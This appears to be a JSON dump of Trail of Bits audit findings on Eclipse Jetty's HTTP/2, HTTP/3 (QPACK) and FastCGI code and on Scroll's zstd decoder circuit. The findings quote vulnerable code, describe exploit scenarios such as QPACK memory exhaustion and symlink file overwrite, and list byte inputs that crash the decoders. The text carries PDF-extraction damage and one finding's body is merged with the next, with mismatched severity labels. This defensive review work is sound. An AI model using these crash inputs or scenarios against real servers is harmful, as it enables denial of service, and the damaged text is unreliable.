org.eclipse.jetty.http3.qpack.internal.instruction.EncodableEn try",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. LiteralNameEntryInstruction incorrectly encodes value length ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "QPACK instructions for inserting entries with literal names and non-Human-coded values will be encoded incorrectly when the values length is over 30, which could cause values to be sent incorrectly or errors to occur during decoding. The following snippet of the LiteralNameEntryInstruction.encode function is responsible for encoding the header value: if (_huffmanValue) byteBuffer.put(( byte )( 0x80 )); NBitIntegerEncoder.encode(byteBuffer, 7 , HuffmanEncoder.octetsNeeded(_value)); HuffmanEncoder.encode(byteBuffer, _value); 78 79 { 80 81 82 83 } 84 85 { 86 87 88 89 } else byteBuffer.put(( byte )( 0x00 )); NBitIntegerEncoder.encode(byteBuffer, 5 , _value.length()); byteBuffer.put(_value.getBytes()); Figure 12.1: LiteralNameEntryInstruction.java , lines 7889 On line 87, 5 is the second parameter to NBitIntegerEncoder.encode , indicating that the number will take up 5 bits in the rst encoded byte; however, the second parameter should be 7 instead. This means that when _value.length() is over 30, it will be incorrectly encoded. Jettys HTTP/3 code is still considered experimental, so this issue should not aect production code, but it should be xed before announcing HTTP/3 support to be production-ready. 56 OSTIF Eclipse: Jetty Security Assessment Recommendations Short term, change the second parameter of the NBitIntegerEncoder.encode function from 5 to 7 in order to reect that the number will take up 7 bits. Long term, write more tests to catch similar encoding/decoding problems. 57 OSTIF Eclipse: Jetty Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "13. FileInitializer does not check for symlinks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "Module conguration les can direct Jetty to download a remote le and save it in the local lesystem while initializing the module. During this process, the FileInitializer class validates the destination path and throws an IOException exception if the destination is outside the ${jetty.base} directory. However, this validation routine does not check for symlinks: // now on copy/download paths (be safe above all else) if (destination != null && !destination.startsWith(_basehome.getBasePath())) throw new IOException( \"For security reasons, Jetty start is unable to process file resource not in ${jetty.base} - \" + location); Figure 13.1: FileInitializer.java , lines 112114 None of the subclasses of FileInitializer check for symlinks either. Thus, if the ${jetty.base} directory contains a symlink, a le path in a modules .ini le beginning with the symlink name will pass the validation check, and the le will be written to a subdirectory of the symlinks destination. Exploit Scenario A systems ${jetty.base} directory contains a symlink called dir , which points to /etc . The system administrator enables a Jetty module whose .ini le contains a [files] entry that downloads a remote le and writes it to the relative path dir/config.conf . The lesystem follows the symlink and writes a new conguration le to /etc/config.conf , which impacts the servers system conguration. Additionally, since the FileInitializer class uses the REPLACE_EXISTING ag, this behavior overwrites an existing system conguration le. Recommendations Short term, rewrite all path checks in FileInitializer and its subclasses to include a call to the Path.toRealPath function, which, by default, will resolve symlinks and produce the real lesystem path pointed to by the Path object. If this real path is outside ${jetty.base} , the le write operation should fail. 58 OSTIF Eclipse: Jetty Security Assessment Long term, consolidate all lesystem operations involving the ${jetty.base} or ${jetty.home} directories into a single centralized class that automatically performs symlink resolution and rejects operations that attempt to read from or write to an unauthorized directory. This class should catch and handle the IOException exception that is thrown in the event of a link loop or a large number of nested symlinks. 59 OSTIF Eclipse: Jetty Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "14. FileInitializer permits downloading les via plaintext HTTP ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "Module conguration les can direct Jetty to download a remote le and save it in the local lesystem while initializing the module. If the specied URL is a plaintext HTTP URL, Jetty does not raise an error or warn the user. Transmitting les over plaintext HTTP is intrinsically unsecure and exposes sensitive data to tampering and eavesdropping in transit. Exploit Scenario A system administrator enables a Jetty module that downloads a remote le over plaintext HTTP during initialization. An attacker with a network intermediary position snis the trac and infers sensitive information about the design and conguration of the Jetty system under conguration. Alternatively, the attacker actively tampers with the le during transmission from the remote server to the Jetty installation, which enables the attacker to alter the modules behavior and launch other attacks against the targeted system. Recommendations Short term, add a check to the FileInitializer class and its subclasses to prohibit downloads over plaintext HTTP. Additionally, add a validation check to the module .ini le parser to reject any conguration that includes a plaintext HTTP URL in the [files] section. Long term, consolidate all remote le downloads conducted during module conguration operations into a single centralized class that automatically rejects plaintext HTTP URLs. If current use cases require support of plaintext HTTP URLs, then at a minimum, have Jetty display a prominent warning message and prompt the user for manual conrmation before performing the unencrypted download. 60 OSTIF Eclipse: Jetty Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. NullPointerException thrown by FastCGI parser on invalid frame type ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "Because of a missing null check, the Jetty FastCGI clients Parser class throws a NullPointerException exception when parsing a frame with an invalid frame type eld. This exception occurs because the findContentParser function returns null when it does not have a ContentParser object matching the specied frame type, and the caller never checks the findContentParser return value for null before dereferencing it. case CONTENT: { ContentParser contentParser = findContentParser(headerParser.getFrameType()); if (headerParser.getContentLength() == 0 ) { padding = headerParser.getPaddingLength(); state = State.PADDING; if (contentParser.noContent()) return true ; } else { ContentParser.Result result = contentParser.parse(buffer); // ...[snip]... } break ; } Figure 15.1: Parser.java , lines 82114 Exploit Scenario An attacker operates a malicious web server that supports FastCGI. A Jetty application communicates with this server by using Jettys built-in FastCGI client. The remote server transmits a frame with an invalid frame type, causing a NullPointerException exception and a crash in the Jetty application. Recommendations Short term, add a null check to the parse function to abort the parsing process before dereferencing a null return value from findContentParser . If a null value is detected, 61 OSTIF Eclipse: Jetty Security Assessment parse should throw an appropriate exception, such as IllegalStateException , that Jetty can catch and handle safely. Long term, build out a larger suite of test cases that ensures graceful handling of malformed trac and data. 62 OSTIF Eclipse: Jetty Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "16. Documentation does not specify that request contents and other user data can be exposed in debug logs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "Over 100 times, the system calls LOG.debug with a parameter of the format BufferUtil.toDetailString(buffer) , which outputs up to 56 bytes of the buer into the log le. Jettys implementations of various protocols and encodings, including GZIP, WebSocket, multipart encoding, and HTTP/2, output user data received over the network to the debug log using this type of call. An example instance from Jettys WebSocket implementation appears in gure 16.1. public Frame.Parsed parse (ByteBuffer buffer) throws WebSocketException { try { // parse through while (buffer.hasRemaining()) { if (LOG.isDebugEnabled()) LOG.debug( \"{} Parsing {}\" , this , BufferUtil.toDetailString(buffer)); // ...[snip]... } // ...[snip]... } // ...[snip]... } Figure 16.1: Parser.java , lines 8896 Although the Jetty 12 Operations Guide does state that Jetty debugging logs can quickly consume massive amounts of disk space, it does not advise system administrators that the logs can contain sensitive user data, such as personally identiable information. Thus, the possibility of raw trac being captured from debug logs is undocumented. Exploit Scenario A Jetty system administrator turns on debug logging in a production environment. During the normal course of operation, a user sends trac containing sensitive information, such as personally identiable information or nancial data, and this data is recorded to the 63 OSTIF Eclipse: Jetty Security Assessment debug log. An attacker who gains access to this log can then read the user data, compromising data condentiality and the users privacy rights. Recommendations Short term, update the Jetty Operations Guide to state that in addition to being extremely large, debug logs can contain sensitive user data and should be treated as sensitive. Long term, consider moving all debugging messages that contain buer excerpts into a high-detail debug log that is enabled only for debug builds of the application. 64 OSTIF Eclipse: Jetty Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "17. HttpStreamOverFCGI internally marks all requests as plaintext HTTP ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "The HttpStreamOverFCGI class processes FastCGI messages in a format that can be processed by other system components that use the HttpStream interface. This classs onHeaders callback mistakenly marks each MetaData.Request object as a plaintext HTTP request, as the TODO comment shown in gure 17.1 indicates: public void onHeaders () { String pathQuery = URIUtil.addPathQuery(_path, _query); // TODO https? MetaData.Request request = new MetaData.Request(_method, HttpScheme.HTTP.asString(), hostPort, pathQuery, HttpVersion.fromString(_version), _headers, Long.MIN_VALUE); // ...[snip]... } Figure 17.1: HttpStreamOverFCGI.java , lines 108119 In some congurations, other Jetty components could misinterpret a message received over FCGI as a plaintext HTTP message, which could cause a request to be incorrectly rejected, redirected in an innite loop, or forwarded to another system over a plaintext HTTP channel instead of HTTPS. Exploit Scenario A Jetty instance runs an FCGI server and uses the HttpStream interface to process messages. The MetaData.Request classs getURI method is used to check the incoming requests URI. This method mistakenly returns a plaintext HTTP URL due to the bug in HttpStreamOverFCGI.java . One of the following takes place during the processing of this request:   An application-level security control checks the incoming requests URI to ensure it was received over a TLS-encrypted channel. Since this check fails, the application rejects the request and refuses to process it, causing a denial of service. An application-level security control checks the incoming requests URI to ensure it was received over a TLS-encrypted channel. Since this check fails, the application 65 OSTIF Eclipse: Jetty Security Assessment attempts to redirect the user to a suitable HTTPS URL. The check fails on this redirected request as well, causing an innite redirect loop and a denial of service.  An application processing FCGI messages acts as a proxy, forwarding certain requests to a third HTTP server. It uses MetaData.Request.getURI to check the requests original URI and mistakenly sends a request over plaintext HTTP. Recommendations Short term, correct the bug in HttpStreamOverFCGI.java to generate the correct URI for the incoming request. Long term, consider streamlining the HTTP implementation to minimize the need for dierent classes to generate URIs from request data. 66 OSTIF Eclipse: Jetty Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "18. Excessively permissive and non-standards-compliant error handling in HTTP/2 implementation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "Jettys HTTP/2 implementation violates RFC 9113 in that it fails to terminate a connection with an appropriate error code when the remote peer sends a frame with one of the following protocol violations:    A SETTINGS frame with the ACK ag set and a nonzero payload length A PUSH_PROMISE frame in a stream with push disabled A GOAWAY frame with its stream ID not set to zero None of these situations creates an exploitable vulnerability. However, noncompliant protocol implementations can create compatibility problems and could cause vulnerabilities when deployed in combination with other miscongured systems. Exploit Scenario A Jetty instance connects to an HTTP/2 server, or serves a connection from an HTTP/2 client, and the remote peer sends trac that should cause Jetty to terminate the connection. Instead, Jetty keeps the connection alive, in violation of RFC 9113. If the remote peer is programmed to handle the noncompliant trac dierently than Jetty, further problems could result, as the two implementations interpret protocol messages dierently. Recommendations Short term, update the HTTP/2 implementation to check for the following error conditions and terminate the connection with an error code that complies with RFC 9113:   A peer receives a SETTINGS frame with the ACK ag set and a payload length greater than zero. A client receives a PUSH_PROMISE frame after having sent, and received an acknowledgement for, a SETTINGS frame with SETTINGS_ENABLE_PUSH equal to zero. 67 OSTIF Eclipse: Jetty Security Assessment  A peer receives a GOAWAY frame with the stream identier eld not set to zero. Long term, audit Jettys implementation of HTTP/2 and other protocols to ensure that Jetty handles errors in a standards-compliant manner and terminates connections as required by the applicable specications. 68 OSTIF Eclipse: Jetty Security Assessment 19. XML external entities and entity expansion in Maven package metadata parser Severity: High Diculty: High Type: Data Validation Finding ID: TOB-JETTY-19 Target: org.eclipse.jetty.start.fileinits.MavenMetadata",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "20. Use of deprecated AccessController class ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "The classes listed in the Target cell above use the java.security.AccessController class, which is a deprecated class slated to be removed in a future Java release. The java.security library documentation states that the AccessController class is only useful in conjunction with the Security Manager, which is also deprecated. Thus, the use of AccessController no longer serves any benecial purpose. The use of this deprecated class could impact Jettys compatibility with future releases of the Java SDK. Recommendations Short term, remove all uses of the AccessController class. Long term, audit the Jetty codebase for the use of classes in the java.security package that may not provide any value in Jetty 12, and remove all references to those classes. 70 OSTIF Eclipse: Jetty Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "21. QUIC server writes SSL private key to temporary plaintext le ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "Jettys QUIC implementation uses quiche, a QUIC and HTTP/3 library maintained by Cloudare. When the servers SSL certicate is handed o to quiche, the private key is extracted from the existing keystore and written to a temporary plaintext PEM le: protected void doStart () throws Exception { // ...[snip]... char [] keyStorePassword = sslContextFactory.getKeyStorePassword().toCharArray(); String keyManagerPassword = sslContextFactory.getKeyManagerPassword(); SSLKeyPair keyPair = new SSLKeyPair( sslContextFactory.getKeyStoreResource().getPath(), sslContextFactory.getKeyStoreType(), keyStorePassword, alias, keyManagerPassword == null ? keyStorePassword : keyManagerPassword.toCharArray() ); File[] pemFiles = keyPair.export( new File(System.getProperty( \"java.io.tmpdir\" ))); privateKeyFile = pemFiles[ 0 ]; certificateChainFile = pemFiles[ 1 ]; } Figure 21.1: QuicServerConnector.java , lines 154179 Storing the private key in this manner exposes it to increased risk of theft. Although the QuicServerConnector class deletes the private key le upon stopping the server, this deleted le may not be immediately removed from the physical storage medium, exposing the le to potential theft by attackers who can access the raw bytes on the disk. A review of quiche suggests that the librarys API may not support reading a DES-encrypted keyle. If that is true, then remediating this issue would require updates to the underlying quiche library. 71 OSTIF Eclipse: Jetty Security Assessment Exploit Scenario An attacker gains read access to a Jetty HTTP/3 servers temporary directory while the server is running. The attacker can retrieve the temporary keyle and read the private key without needing to obtain or guess the encryption key for the original keystore. With this private key in hand, the attacker decrypts and tampers with all TLS communications that use the associated certicate. Recommendations Short term, investigate the quiche librarys API to determine whether it can readily support password-encrypted private keyles. If so, update Jetty to save the private key in a temporary password-protected le and to forward that password to quiche. Alternatively, if password-encrypted private keyles can be supported, have Jetty pass the unencrypted private key directly to quiche as a function argument. Either option would obviate the need to store the key in a plaintext le on the servers lesystem. If quiche does not support either of these changes, open an issue or pull request for quiche to implement a x for this issue. 72 OSTIF Eclipse: Jetty Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "22. Repeated code between HPACK and QPACK ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "Classes for dealing with n-bit integers and Human coding are implemented both in the jetty-http2-hpack and in jetty-http3-qpack libraries. These classes have very similar functionality but are implemented in two dierent places, sometimes with identical code and other times with dierent implementations. In some cases ( TOB-JETTY-9 ), one implementation has a bug that the other implementation does not have. The codebase would be easier to maintain and keep secure if the implementations were merged. Exploit Scenario A vulnerability is found in the Human encoding implementation, which has identical code in HPACK and QPACK. The vulnerability is xed in one implementation but not the other, leaving one of the implementations vulnerable. Recommendations Short term, merge the two implementations of n-bit integers and Human coding classes. Long term, audit the Jetty codebase for other classes with very similar functionality. 73 OSTIF Eclipse: Jetty Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "23. Various exceptions in HpackDecoder.decode and QpackDecoder.decode ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "The HpackDecoder and QpackDecoder classes both throw unexpected Java-level exceptions:  HpackDecoder.decode(0x03) throws BufferUnderflowException .  HpackDecoder.decode(0x4800) throws NumberFormatException .  HpackDecoder.decode(0x3fff 2e) throws IllegalArgumentException .  HpackDecoder.decode(0x3fff 81ff ff2e) throws NullPointerException .  HpackDecoder.decode(0xffff ffff f8ff ffff ffff ffff ffff ffff ffff ffff ffff ffff 0202 0000) throws ArrayIndexOutOfBoundsException .  QpackDecoder.decode(..., 0x81, ...) throws IndexOutOfBoundsException .  QpackDecoder.decode(..., 0xfff8 ffff f75b, ...) throws ArithmeticException . For both HPACK and QPACK, these exceptions appear to be caught higher up in the call chain by catch (Throwable x) statements every time the decode functions are called. However, catching them within decode and throwing a Jetty-level exception within the catch statement would result in cleaner, more robust code. Exploit Scenario Jetty developers refactor the codebase, moving function calls around and introducing a new point in the code where HpackDecoder.decode is called. Assuming that decode will throw only org.jetty errors, they forget to wrap this call in a catch (Throwable x) statement. This results in a DoS vulnerability. Recommendations Short term, document in the code that Java-level exceptions can be thrown. Long term, modify the decode functions so that they throw only Jetty-level exceptions. 74 OSTIF Eclipse: Jetty Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "24. Incorrect QPACK encoding when multi-byte characters are used ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "Javas string.length() function returns the number of characters in a string, which can be dierent from the number of bytes returned by the string.getBytes() function. However, QPACK encoding methods assume that they return the same number, which could cause incorrect encodings. In EncodableEntry.LiteralEntry , which is used to encode HTTP/3 header elds, the following method is used for encoding: public void encode (ByteBuffer buffer, int base) 214 215 { 216 byte allowIntermediary = 0x00 ; // TODO: this is 0x10 bit, when should this be set? 217 218 219 220 221 222 223 224 String name = getName(); String value = getValue(); // Encode the prefix code and the name. if (_huffman) { buffer.put(( byte )( 0x28 | allowIntermediary)); NBitIntegerEncoder.encode(buffer, 3 , HuffmanEncoder.octetsNeeded(name)); 225 226 227 HuffmanEncoder.encode(buffer, name); buffer.put(( byte ) 0x80 ); NBitIntegerEncoder.encode(buffer, 7 , HuffmanEncoder.octetsNeeded(value)); 228 229 230 231 232 HuffmanEncoder.encode(buffer, value); } else { // TODO: What charset should we be using? (this applies to the instruction generators as well). 233 234 235 236 237 238 buffer.put(( byte )( 0x20 | allowIntermediary)); NBitIntegerEncoder.encode(buffer, 3 , name.length()); buffer.put(name.getBytes()); buffer.put(( byte ) 0x00 ); NBitIntegerEncoder.encode(buffer, 7 , value.length()); buffer.put(value.getBytes()); 75 OSTIF Eclipse: Jetty Security Assessment 239 240 } } Figure 24.1: EncodableEntry.java , lines 214240 Note in particular lines 232238, which are used to encode literal (non-Human-coded) names and values. The value returned by name.length() is added to the bytestring, followed by the value returned by name.getBytes() . Then, the value returned by value.length() is added to the bytestring, followed by the value returned by value.getBytes() . When this bytestring is decoded, the decoder will read the name length eld and then read that many bytes as the name. If multibyte characters were used in the name eld, the decoder will read too few bytes. The rest of the bytestring will also be decoded incorrectly, since the decoder will continue reading at the wrong point in the bytestring. The same issue occurs if multibyte characters were used in the value eld. The same issue appears in EncodableEntry.ReferencedNameEntry.encode : if (_huffman) 164 // Encode the value. 165 String value = getValue(); 166 167 { 168 169 170 171 } 172 173 { 174 175 176 177 } else buffer.put(( byte ) 0x80 ); NBitIntegerEncoder.encode(buffer, 7 , HuffmanEncoder.octetsNeeded(value)); HuffmanEncoder.encode(buffer, value); buffer.put(( byte ) 0x00 ); NBitIntegerEncoder.encode(buffer, 7 , value.length()); buffer.put(value.getBytes()); Figure 24.2: EncodableEntry.java , lines 164177 If value has multibyte characters, it will be incorrectly encoded in lines 174176. Jettys HTTP/3 code is still considered experimental, so this issue should not aect production code, but it should be xed before announcing HTTP/3 support to be production-ready. Exploit Scenario A Jetty server attempts to add the Set-Cookie header, setting a cookie value to a UTF-8-encoded string that contains multibyte characters. This causes an incorrect cookie value to be set and the rest of the headers in this message to be parsed incorrectly. 76 OSTIF Eclipse: Jetty Security Assessment Recommendations Short term, have the encode function in both EncodableEntry.LiteralEntry and EncodableEntry.ReferencedNameEntry encode the length of the string using string.getBytes() rather than string.length() . 77 OSTIF Eclipse: Jetty Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "25. No limits on maximum capacity in QPACK decoder ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "In QPACK, an encoder can set the dynamic table capacity of the decoder using a Set Dynamic Table Capacity instruction. The HTTP/3 specication requires that the capacity be no larger than the SETTINGS_QPACK_MAX_TABLE_CAPACITY limit chosen by the decoder. However, nowhere in the QPACK code is this limit checked for. This means that the encoder can choose whatever capacity it wants (up to Javas maximum integer value), allowing it to take up large amounts of space on the decoders memory. Jettys HTTP/3 code is still considered experimental, so this issue should not aect production code, but it should be xed before announcing HTTP/3 support to be production-ready. Exploit Scenario A Jetty server supporting QPACK is running. An attacker opens a connection to the server. He sends a Set Dynamic Table Capacity instruction, setting the dynamic table capacity to Javas maximum integer value, 2 31-1 (2.1 GB). He then repeatedly enters very large values into the servers dynamic table using an Insert with Literal Name instruction until the full 2.1 GB capacity is taken up. The attacker repeats this using multiple connections until the server runs out of memory and crashes. Recommendations Short term, enforce the SETTINGS_QPACK_MAX_TABLE_CAPACITY limit on the capacity. Long term, audit Jettys implementation of QPACK and other protocols to ensure that Jetty enforces limits as required by the standards. 78 OSTIF Eclipse: Jetty Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "1. Multiple missing Boolean constraints on Boolean advice columns ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf",
        "body": "The zstd decoder tables require the use of many Boolean type values, being either 0 or 1. Other values, such as 2 or -1, would cause many of the formulas used for Boolean logic to catastrophically fail, leading to potential constraint compromise. Below, we detail a non-exhaustive list of Boolean advice columns that appear to be unconstrained.  FseTable::is_new_symbol  FseTable::is_skipped_state  FseSortedStatesTable::is_new_symbol  FseSortedStatesTable::is_skipped_state  FseDecoder::is_repeat_bits_loop  FseDecoder::is_trailing_bits  BitstreamDecoder::is_nb0  BitstreamDecoder::is_nil  BlockConfig::compression_modes  TagConfig::is_reverse Exploit Scenario An attacker leverages the soundness issues of an unconstrained Boolean to disable other constraints that are derived from the unconstrained Boolean. This would allow an attacker to generate a valid proof with an invalid witness, compromising the correctness of the zstd decoder circuit. Recommendations Short term, perform the correct Boolean constraints on the necessary columns. Long term, consider annotating the Boolean columns with a wrapper type that checks if the constraint function has been called. Consider a set of checks that will ensure that all BooleanAdvice columns have been constrained. Perhaps an automated way to do this is a custom Drop implementation that will panic, alerting developers during testing. An alternative is to restrict access to the underlying column until the constraint has been added. struct BooleanAdvice { col: Column <Advice>, constrained: bool , } impl BooleanAdvice { fn column (& self ) -> & Column <Advice> { if self .constrained { & self .col } else { panic! ( \"unconstrained boolean advice\" ) } } } Figure 1.1: An example Boolean advice wrapper and protected access",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "2. Column annotations do not match lookup table columns ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf",
        "body": "The column annotations for the SeqInstTable , RlpFsmDataTable , and LiteralsHeaderTable tables do not match the tables columns:    In the SeqInstTable the n_seq and block_index annotations are out of order; In the LiteralsHeaderTable , there is an additional annotation ( byte_offset ) that would cause all subsequent annotations to refer to the wrong column; The RlpFsmDataTable has an unannotated column ( gas_cost_acc ). fn columns (& self ) -> Vec <Column<Any>> { vec! [ self .q_enabled.into(), self .block_index.into() , self .n_seq.into() , self .s_beginning.column.into(), self .seq_index.into(), self .literal_len.into(), self .match_offset.into(), self .match_len.into(), ] } fn annotations (& self ) -> Vec < String > { vec! [ String ::from( \"q_enabled\" ), String ::from( \"n_seq\" ) , String ::from( \"block_index\" ) , Figure 2.1: aggregator/src/aggregation/decoder/tables/seqinst_table.rs#L130L147 fn columns (& self ) -> Vec <Column<Any>> { vec! [ self .block_idx.into(), self .byte0.into(), self .byte1.into(), self .byte2.into(), self .size_format_bit0.into(), self .size_format_bit1.into(), self .regen_size.into(), self .is_padding.column.into(), ] } fn annotations (& self ) -> Vec < String > { vec! [ String ::from( \"block_idx\" ), String ::from( \"byte_offset\" ), String ::from( \"byte0\" ), String ::from( \"byte1\" ), String ::from( \"byte2\" ), String ::from( \"size_format_bit0\" ), String ::from( \"size_format_bit1\" ), String ::from( \"regen_size\" ), String ::from( \"is_padding\" ), ] } Figure 2.2: aggregator/src/aggregation/decoder/tables/literals_header.rs#L274L301 impl <F: Field > LookupTable<F> for RlpFsmDataTable { fn columns (& self ) -> Vec <Column<Any>> { vec! [ self .tx_id.into(), self .format.into(), self .byte_idx.into(), self .byte_rev_idx.into(), self .byte_value.into(), self .bytes_rlc.into(), self .gas_cost_acc.into(), ] } fn annotations (& self ) -> Vec < String > { vec! [ String ::from( \"tx_id\" ), String ::from( \"format\" ), String ::from( \"byte_idx\" ), String ::from( \"byte_rev_idx\" ), String ::from( \"byte_value\" ), String ::from( \"bytes_rlc\" ), ] } } Figure 2.3: zkevm-circuits/src/rlp_circuit_fsm.rs#L61L84 Recommendations Short term, x the reported column annotations. Long term, add debug assertions or tests that ensure that the number of columns and annotations is the same for a lookup table. Consider using zip_eq instead of zip in the LookupTable::{annotate_columns, annotate_columns_in_region} functions: /// Annotates a lookup table by passing annotations for each of it's /// columns. fn annotate_columns (& self , cs: & mut ConstraintSystem<F>) { self .columns() .iter() .zip( self .annotations().iter()) .for_each(|(&col, ann)| cs.annotate_lookup_any_column(col, || ann)) } /// Annotates columns of a table embedded within a circuit region. fn annotate_columns_in_region (& self , region: & mut Region<F>) { self .columns() .iter() .zip( self .annotations().iter()) .for_each(|(&col, ann)| region.name_column(|| ann, col)) } Figure 2.4: zkevm-circuits/src/table.rs#87102 Alternatively, consider adding a derive macro for LookupTable . This way, columns made available for lookup can easily be annotated via derive macro helper attributes . The gure below shows an example: #[derive(Clone, Debug, LookupTable)] pub struct SeqInstTable <F: Field > { #[lookup] q_enabled: Column <Fixed>, #[lookup] block_index: Column <Advice>, #[lookup] n_seq: Column <Advice>, #[lookup] seq_index: Column <Advice>, #[lookup] s_beginning: Column <Advice>, // ... offset: Column <Advice>, acc_literal_len: Column <Advice>, // ... } Figure 2.5: A derive macro-based lookup and annotation system",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "3. Unexpected BlockType for LiteralsHeader reaches unreachable! macro ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf",
        "body": "The witness assignment code uses an unreachable! macro if an unexpected BlockType is found while parsing the header bytes. If handpicked values are chosen in byte0 , this will lead to a runtime panic during witness generation/assignment. let lh_bytes = [ byte0 as u8 , byte1 as u8 , byte2 as u8 ]; let literals_block_type = BlockType::from( lh_bytes[ 0 ] & 0x3 ); let size_format = (lh_bytes[ 0 ] >> 2 ) & 3 ; let [n_bits_fmt, n_bits_regen, n_bytes_header]: [ usize ; 3 ] = match literals_block_type { BlockType::RawBlock => match size_format { 0b00 | 0b10 => [ 1 , 5 , 1 ], 0b01 => [ 2 , 12 , 2 ], 0b11 => [ 2 , 20 , 3 ], _ => unreachable! ( \"size_format out of bound\" ), }, _ => unreachable! ( \"BlockType::* unexpected. Must be raw bytes for literals.\" ), }; Figure 3.1: aggregator/src/aggregation/decoder/tables/literals_header.rs#206221 Exploit Scenario The prover is passed a malformed compressed blob with an unexpected block type, causing the prover to halt. Recommendations Short term, return an Error instead of calling the unreachable! macro. Long term, investigate all calls to the unreachable! macro used during witness assignment.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "4. RomTagTransition table does not allow ZstdBlockSequenceHeader -> BlockHeader transitions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf",
        "body": "The RomTagTransition table does not allow transitioning from ZstdBlockSequenceHeader to BlockHeader . This causes a completeness issue where honestly generated compressed data does not satisfy the tag transition circuit. Figure 4.1 shows the allowed transitions and highlights the transitions that reach BlockHeader  none originate from ZstdBlockSequenceHeader : [ ] (FrameHeaderDescriptor, FrameContentSize), (FrameContentSize, BlockHeader ), (BlockHeader, ZstdBlockLiteralsHeader), (ZstdBlockLiteralsHeader, ZstdBlockLiteralsRawBytes), (ZstdBlockLiteralsRawBytes, ZstdBlockSequenceHeader), (ZstdBlockSequenceHeader, ZstdBlockSequenceFseCode), (ZstdBlockSequenceHeader, ZstdBlockSequenceData), (ZstdBlockSequenceFseCode, ZstdBlockSequenceFseCode), (ZstdBlockSequenceFseCode, ZstdBlockSequenceData), (ZstdBlockSequenceData, BlockHeader ), // multi-block (ZstdBlockSequenceData, Null), (Null, Null), Figure 4.1: aggregator/src/aggregation/decoder/tables/fixed/tag_transition.rs#L28L4 1 However, in the specication, the ZstdBlockSequenceHeader to BlockHeader transition is described and has associated constraints: Figure 4.2: Circuit specication where a ZstdBlockSequenceHeader to BlockHeader transition is mentioned Figure 4.3 shows the implementation of the constraint from gure 4.2: cb.condition(is_prev_sequence_header(meta), |cb| { cb.require_equal( \"tag::prev=SeqHeader\" , config .block_config .is_empty_sequences(meta, Rotation::prev()), 1. expr(), ); }); Figure 4.3: aggregator/src/aggregation/decoder.rs#18071815 Exploit Scenario A two-block encoded data, where the rst block contains no sequences to decode, is honestly generated by the zstd compression algorithm. However, due to the missing transition, this compressed data does not satisfy the decoder circuit. Recommendations Short term, allow for the ZstdBlockSequenceHeader to BlockHeader transition to occur in the tag transition circuit, or document why this is not allowed. Long term, add tests with zstd compressed data that exercise all possible valid tag transitions.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "5. The back referencing phase is not properly constrained to a monotone behavior once activated ",
